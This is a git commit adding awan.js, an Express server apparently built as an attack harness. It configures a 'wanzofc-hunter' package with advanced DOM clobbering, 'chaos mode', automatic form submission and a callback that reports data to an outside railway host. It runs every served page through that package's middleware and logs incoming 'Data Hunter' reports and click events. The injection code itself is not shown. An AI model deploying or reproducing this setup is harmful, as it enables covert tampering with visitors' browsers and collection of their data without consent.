cbe7942c6c3798478ddfe5926990b0b414b2ca6b
wanzofc only <zanssxploit@gmail.com>
2025-04-28 01:50:00 +0700

    Add files via upload

---
+++ awan.js
@@ -0,0 +1,42 @@
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const bodyParser = require('body-parser');
+const { configure, expressMiddleware } = require('wanzofc-hunter');
+const app = express();
+const PORT = process.env.PORT || 3000;
+configure({
+    callbackURL: 'https://wanzofc-hunter.up.railway.apl/report',
+    iframeURL: 'https://chat-disquskai.vercel.app',
+    domClobbering: true,
+    domClobberingLevel: 'advanced',
+    chaosMode: true,
+    autoSubmitForms: true
+});
+app.use(bodyParser.json());
+app.post('/report', (req, res) => {
+    console.log('>> Data Hunter <<');
+    console.log(JSON.stringify(req.body, null, 2));
+    res.status(200).send('Report diterima');
+});
+app.post('/klik', (req, res) => {
+    console.log('>> Event Klik Diterima <<');
+    console.log(JSON.stringify(req.body, null, 2));
+    res.status(200).send('Klik diterima!');
+});
+app.use((req, res, next) => {
+    const filePath = path.join(__dirname, req.path === '/' ? 'index.html' : req.path);
+
+    fs.readFile(filePath, 'utf8', (err, data) => {
+        if (err) {
+            console.error('File tidak ditemukan:', filePath);
+            return res.status(404).send('404 Not Found');
+        }
+
+        res.body = data;
+        expressMiddleware()(req, res, next);
+    });
+});
+app.listen(PORT, () => {
+    console.log(`Server berjalan di http://localhost:${PORT}`);
+});
